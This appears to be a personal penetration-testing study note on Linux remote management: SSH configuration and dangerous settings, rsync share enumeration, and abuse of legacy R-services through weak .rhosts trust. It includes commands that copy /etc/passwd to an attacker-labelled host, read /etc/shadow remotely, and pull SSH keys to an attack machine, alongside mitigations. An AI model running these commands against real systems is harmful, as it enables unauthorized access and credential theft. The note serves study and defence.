---
title: Linux Remote Management Protocols
date: 2024-10-30
tags: 
techniques: 
tools:
  - ssh
machines: 
difficulty: 
status: 
type: 
os: 
categories: 
exam-priority: 
time-invested:
---
>[!tip]- Tips
>Write tips here

### References
- Layered Enumeration Framework Guide
- Comprehensive OSCP Enumeration Strategies

### **Linux Remote Management Protocols**

#### **Overview**

Remote management of Linux servers is essential for efficient troubleshooting and system administration. By using protocols and applications designed for remote management, we can interact with servers from anywhere without being physically present. These tools also become targets for attackers, especially if misconfigured, making their secure setup and understanding critical for penetration testers.

---

#### **Secure Shell (SSH)**

- **Purpose**: SSH allows encrypted, direct communication between two systems over **TCP port 22**.
- **Advantages**:
    - Prevents data interception by third parties.
    - Universally supported across major operating systems (Linux, macOS, Windows).
    - Native to Unix-based systems and open-source on Linux as **OpenSSH**.
- **SSH Protocol Versions**:
    - **SSH-1**: Vulnerable to **Man-in-the-Middle (MITM)** attacks.
    - **SSH-2**: Enhanced encryption, speed, stability, and security.

---

#### **Use Cases**

1. **Remote Host Management**: Command-line or GUI.
2. **File Transfers**.
3. **Port Forwarding**.

---

#### **Authentication Methods in OpenSSH**

1. Password Authentication.
2. Public-Key Authentication.
3. Host-Based Authentication.
4. Keyboard Authentication.
5. Challenge-Response Authentication.
6. GSSAPI Authentication.

**Focus**: Public-Key Authentication.

---

### **Public-Key Authentication**

- **Key Pair Setup**:
    
    - **Private Key**: Stored securely on the client device, protected with a **passphrase**.
    - **Public Key**: Stored on the server.
- **Authentication Steps**:
    
    1. **Server Verification**:
        
        - Server sends an encrypted certificate to the client.
        - Client confirms it matches the trusted server.
    2. **Client Authentication**:
        
        - Server sends a cryptographic challenge encrypted with the public key.
        - Client solves it using the private key and returns the solution.
- **Benefits**:
    
    - Passphrase entered once per session for access to multiple servers.
    - Prevents unauthorized use if the client machine is compromised.

---

#### **Default Configuration of OpenSSH**

- The `sshd_config` file governs OpenSSH server behavior.
- By default, it includes **X11 forwarding**, which had a command injection vulnerability in **version 7.2p1** (2016).
- **Recommendation**: Avoid GUIs for server management and review configurations to minimize vulnerabilities.

```shell
cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'
```
- **`cat /etc/ssh/sshd_config`**:  
    This command reads and outputs the content of the SSH configuration file.
    
- **`| grep -v "#"`**:  
    The `grep` command with the `-v` flag filters out lines that contain a `#`, which are comments in the configuration file.
    
    - `-v`: Invert match, meaning exclude lines matching the pattern.
    - `#`: Matches lines with `#` anywhere, which are treated as comments.
- **`| sed -r '/^\s*$/d'`**:  
    This part uses `sed` (stream editor) to remove blank lines.
    
    - `-r`: Enables extended regular expressions for the `sed` command.
    - `/^\s*$/`: Matches lines that contain only whitespace (or are completely empty).
        - `^`: Beginning of the line.
        - `\s*`: Zero or more whitespace characters.
        - `$`: End of the line.
    - `d`: Deletes the matched lines.
---
## Dangerous Settings

Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:

|**Setting**|**Description**|
|---|---|
|`PasswordAuthentication yes`|Allows password-based authentication.|
|`PermitEmptyPasswords yes`|Allows the use of empty passwords.|
|`PermitRootLogin yes`|Allows to log in as the root user.|
|`Protocol 1`|Uses an outdated version of encryption.|
|`X11Forwarding yes`|Allows X11 forwarding for GUI applications.|
|`AllowTcpForwarding yes`|Allows forwarding of TCP ports.|
|`PermitTunnel`|Allows tunneling.|
|`DebianBanner yes`|Displays a specific banner when logging in.|

## Footprinting the Service
One of the tools we can use to fingerprint the SSH server is [ssh-audit](https://github.com/jtesta/ssh-audit). It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.

```shell
 git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
```
```bash
./ssh-audit.py <ip>
```

## Change Authentication Method

```bash
ssh -v cry01t2@<ip>
```
For potential brute-force attacks, we can specify the authentication method with the SSH client option `PreferredAuthentications`.
```shell
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```
 [[Rsync]] is a powerful and efficient tool for copying files both locally and remotely. It is widely used for **backups**, **file mirroring**, and **synchronization** due to its ability to minimize network usage through a **delta-transfer algorithm**.

### Scanning for Rsync
```bash
sudo nmap -sV -p 873 <ip>

```

### Probing for Accessible Shares
We can next probe the service a bit to see what we can gain access to.
```bash
nc -nv <ip> 873
```

### Enumerating an Open Share
Here we can see a share called `dev`, and we can enumerate it further.
```bash
rsync -av --list-only rsync://127.0.01/dev
```

From the above output, we can see a few interesting files that may be worth pulling down to investigate further. We can also see that a directory likely containing SSH keys is accessible. From here, we could sync all files to our attack host with the command `rsync -av rsync://127.0.0.1/dev`. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the `-e ssh` flag, or `-e "ssh -p2222"` if a non-standard port is in use for SSH. This [guide](https://phoenixnap.com/kb/how-to-rsync-over-ssh) is helpful for understanding the syntax for using Rsync over SSH.

### **Key Takeaways**

- SSH is vital for secure remote management but must be configured correctly to prevent exploitation.
- Public-key authentication offers enhanced security over password-based methods.
- Default configurations may include unnecessary features (e.g., X11 forwarding) that should be evaluated and adjusted.

**Exam Priority**: High  
**Techniques/Tools**: SSH, `sshd_config`, Key Management  
**Tags**: #Linux #SSH #RemoteManagement

### R-Services
### **R-Services Overview**

R-Services are legacy protocols and commands used for remote access and execution between Unix hosts over TCP/IP. While largely replaced by SSH due to significant security flaws, R-Services may still be encountered in penetration tests, especially on older systems. They rely on plaintext communication, making them vulnerable to attacks like **Man-in-the-Middle (MITM)**.

---

### **Key Features of R-Services**

- **Ports**: Operate on ports **512**, **513**, and **514**.
- **Transport**: Utilize TCP for communication.
- **Security Risks**: Data, including passwords, is transmitted in **plaintext**, enabling easy interception.
- **Common OS**: Found on older systems like **Solaris**, **HP-UX**, and **AIX**.
- **Programs**: Accessed using a suite of commands collectively known as **r-commands**.

---

### **Frequently Used R-Commands**

|**Command**|**Service Daemon**|**Port**|**Description**|
|---|---|---|---|
|**rcp**|rshd|514|Remote file copying between Unix hosts. Similar to `scp`.|
|**rexec**|rexecd|512|Executes commands on a remote host with authentication.|
|**rlogin**|rlogind|513|Provides terminal access to a remote host.|
|**rsh**|rshd|514|Executes commands on a remote host without login.|
|**rstat**|rpc.rstatd|512/UDP|Reports system performance statistics.|
|**ruptime**|rstatd|512|Displays uptime and load averages of remote hosts.|
|**rwho**|rwhod|513/UDP|Shows users currently logged into a remote host.|

---

### **Commonly Abused R-Commands**

#### **1. rcp (Remote Copy)**

- **Usage**:

```shell
rcp <source_file> <remote_user>@<remote_host>:<destination_path>
```

- **Abuse Potential**: If misconfigured, files can be copied without authentication or access restrictions.
- **Example**:

```bash
rcp /etc/passwd attacker@192.168.1.10:/tmp
```

#### **2. rexec (Remote Execution)**

- **Usage**:

```sh
rexec <remote_host> -l <username> <command>
```

- **Abuse Potential**: Credentials are sent in plaintext. An attacker could intercept credentials and commands.
- **Example**:

```bash
rexec 192.168.1.10 -l root cat /etc/shadow
```


#### **3. rlogin (Remote Login)**

- **Usage**:

```bash
rlogin <remote_host>
```

- **Abuse Potential**: If `.rhosts` is improperly configured, attackers can log in without a password.
- **Example**:

`rlogin -l root 192.168.1.10`

#### **4. rsh (Remote Shell)**

- **Usage**:

```bash
rsh <remote_host> <command>
```

- **Abuse Potential**: Executes commands without requiring a password if `.rhosts` allows it.
- **Example**:

```bash
rsh 192.168.1.10 'cat /etc/passwd'
```

---

### **Penetration Testing Tips**

1. **Check for Open Ports**:  
    Scan for ports 512, 513, and 514 using `nmap`.
    
    ```bash
nmap -p 512-514 <target_ip>
```
    
2. **Enumerate Services**:  
    Use tools like **rpcinfo** or **rsh** to gather service information.

    ```bash
rpcinfo -p <target_ip>
```
    
3. **Exploit Misconfigured `.rhosts` Files**:  
    `.rhosts` files define trusted hosts and users. Weak configurations allow remote access without passwords.
    
    - Look for `.rhosts` files in user home directories:
        ```bash
find / -name ".rhosts" 2>/dev/null
```
        
4. **Exploit Trusted Host Relationships**:  
    If `.rhosts` trusts your machine, you can spoof your hostname and execute commands. Example with **rsh**:
    
    ```bash
    rsh -l root <target_host> 'cat /etc/shadow'
    ```
    
5. **Intercept Credentials**:  
    Use tools like Wireshark to capture plaintext credentials during R-Command usage.
### **Mitigation and Recommendations**

- Replace R-Services with **SSH** for secure remote access.
- Disable unnecessary services in `/etc/services`.
- Remove `.rhosts` files or restrict them strictly.
- Use network firewalls to block ports **512–514**.


|**Command**|**Service Daemon**|**Port**|**Transport Protocol**|**Description**|
|---|---|---|---|---|
|`rcp`|`rshd`|514|TCP|Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the `cp` command on Linux but provides `no warning to the user for overwriting existing files on a system`.|
|`rsh`|`rshd`|514|TCP|Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files for validation.|
|`rexec`|`rexecd`|512|TCP|Enables a user to run shell commands on a remote machine. Requires authentication through the use of a `username` and `password` through an unencrypted network socket. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files.|

#### /etc/hosts.equiv

```shell
cat /etc/hosts.equiv
```

Now that we have a basic understanding of `r-commands`, let's do some quick footprinting using `Nmap` to determine if all necessary ports are open.

### Scanning for R-Services
```bash
sudo nmap -sV -p 512,513,514 <ip>
```


### **Key Takeaways**

- **R-Services** are inherently insecure due to plaintext communication and lack of modern encryption.
- Misconfigurations like weak `.rhosts` files provide attackers an easy entry point.
- Penetration testers should prioritize **port scanning**, **service enumeration**, and **`.rhosts` abuse** when encountering R-Services.

**Exam Priority**: Moderate  
**Tags**: #RServices #PenetrationTesting #LegacyProtocols

### **Access Control & Trusted Relationships**

---

#### **Overview**

R-services have weak access control mechanisms that rely heavily on trust. This design makes them inherently insecure and was one of the primary reasons SSH replaced them. Trusted relationships between systems and users are managed through specific configuration files: `/etc/hosts.equiv` and `.rhosts`.

---

#### **Authentication Methods**

1. **Pluggable Authentication Modules (PAM):**
    
    - Used by r-services for authenticating users.
    - Modular and flexible, but often bypassed due to trusted relationships.
2. **Trusted Relationship Files:**
    
    - **`/etc/hosts.equiv`:**
        - System-wide trust file.
        - Applies to all users unless overridden by `.rhosts`.
    - **`~/.rhosts`:**
        - User-specific trust file.
        - Overrides `/etc/hosts.equiv` for the corresponding user.

---

#### **File Syntax**

- **Format:**
    ```bash
hostname [username]
```
    
    - **`hostname`**: Specifies the trusted host (can be an IP or hostname).
    - **`username`**: Optional. Specifies the trusted user on that host.
- **Examples:**
    
    - Trust all users from a specific host:
    
        ```bash
trusted-host.example.com
```
        
    - Trust a specific user from a specific host:
    
        ```bash
trusted-host.example.com trusteduser
```
        
    - Trust all users from any host (`+` is dangerous):
        
        `+`
        

---

#### **Security Risks**

1. **Weak Authentication:**
    
    - Authentication is based solely on the trust established in the files.
    - No password or additional verification is required.
2. **Man-in-the-Middle (MITM) Attacks:**
    
    - Unencrypted communication can be intercepted.
    - Trusted hostnames/IPs can be spoofed.
3. **Unauthorized Access:**
    
    - Improperly configured files (`+`) can allow access to anyone.
    - Overlooked `.rhosts` files in user directories may create unexpected backdoors.

---

#### **Mitigation Strategies**

1. **Replace R-services with SSH:**
    
    - Use public-key authentication for secure connections.
2. **Remove/Restrict Trust Files:**
    
    - Delete or minimize entries in `/etc/hosts.equiv` and `.rhosts`.
3. **Enforce Secure Permissions:**
    
    - Restrict access to `/etc/hosts.equiv` (`chmod 600`).
    - Regularly audit `.rhosts` files for unnecessary or dangerous entries.
4. **Network Segmentation:**
    
    - Limit access to systems using R-services to trusted internal networks only.
    - 

**Note:** The `hosts.equiv` file is recognized as the global configuration regarding all users on a system, whereas `.rhosts` provides a per-user configuration.

```bash
cat .rhosts
```

## Logging in Using Rlogin


```bash
rlogin <ip> -l htb-student
```
We have successfully logged in under the `htb-student` account on the remote host due to the misconfigurations in the `.rhosts` file. Once successfully logged in, we can also abuse the `rwho` command to list all interactive sessions on the local network by sending requests to the UDP port 513.

## Listing Authenticated Users Using Rwho

```bash
rwho
```

## Listing Authenticated Users Using Rusers
```bash
rusers -al <ip>
```

As we can see, R-services are less frequently used nowadays due to their inherent security flaws and the availability of more secure protocols such as SSH. To be a well-rounded information security professional, we must have a broad and deep understanding of many systems, applications, protocols, etc. So, file away this knowledge about R-services because you never know when you may encounter them.

## Final Thoughts

Remote management services can provide us with a treasure trove of data and often be abused for unauthorized access through either weak/default credentials or password re-use. We should always probe these services for as much information as we can gather and leave no stone unturned, especially when we have compiled a list of credentials from elsewhere in the target network.

